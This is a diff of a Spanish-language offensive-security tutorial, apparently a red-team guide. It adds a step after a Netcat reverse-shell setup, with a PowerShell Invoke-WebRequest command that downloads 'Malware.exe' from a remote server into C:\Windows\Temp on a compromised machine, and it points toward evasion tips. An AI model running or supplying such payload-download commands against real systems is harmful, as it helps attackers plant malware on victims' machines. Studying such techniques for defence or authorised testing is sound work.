@@ -75,6 +75,13 @@ En la máquina atacante (Kali Linux), configure Netcat para escuchar en el puert
 
 <img width="1365" height="720" alt="3" src="https://github.com/user-attachments/assets/79417535-c85e-4d9f-a297-42d18a99921b" />
 
+Una vez usted haya ganado acceso al equipo, podrá utilizar Powershell para ejecutar comandos. Por ejemplo, descargar archivos remotos en el equipo comprometido:
+```powershell
+powershell -Command "Invoke-WebRequest -Uri 'https://servidor-remoto/Malware.exe' -OutFile 'C:\Windows\Temp\Malware.exe'"
+```
+
+<img width="1281" height="572" alt="DownloadFile" src="https://github.com/user-attachments/assets/f9f6bdf3-3a37-4a06-9ce6-27587fd4d1f2" />
+
 <h1 align="center"></h1>
 
 ### Evasión Tips
